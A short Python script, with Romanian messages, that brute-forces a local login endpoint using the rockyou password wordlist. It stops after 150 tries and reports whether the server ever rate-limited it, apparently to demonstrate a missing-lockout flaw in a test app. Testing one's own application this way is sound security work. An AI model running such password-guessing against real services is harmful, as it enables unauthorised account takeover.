import requests
import time

TARGET = "http://localhost:5000/login"
EMAIL = "test@test.com"
WORDLIST = "/path/to/rockyou.txt"
MAX_ATTEMPTS = 150  # suficient pentru screenshot

print(f"[*] Tinta: {TARGET}")
print(f"[*] Email: {EMAIL}")
print(f"[*] Incepe bruteforce...\n")

start = time.time()
found = False

with open(WORDLIST, "r", encoding="latin-1") as f:
    for i, line in enumerate(f):
        if i >= MAX_ATTEMPTS:
            break

        password = line.strip()

        resp = requests.post(TARGET, json={"email": EMAIL, "password": password})
        status = resp.status_code
        body = resp.json()

        if body.get("status") == "success":
            elapsed = time.time() - start
            print(f"[+] PAROLA GASITA dupa {i+1} incercari in {elapsed:.2f}s")
            print(f"    Email:  {EMAIL}")
            print(f"    Parola: {password}")
            found = True
            break
        else:
            print(f"[-] [{i+1:04d}] '{password}' -> {status} {body.get('message')}")

if not found:
    elapsed = time.time() - start
    print(f"\n[!] Parola nu gasita in primele {MAX_ATTEMPTS} incercari ({elapsed:.2f}s)")
    print(f"[!] Serverul nu a trimis niciun HTTP 429.")
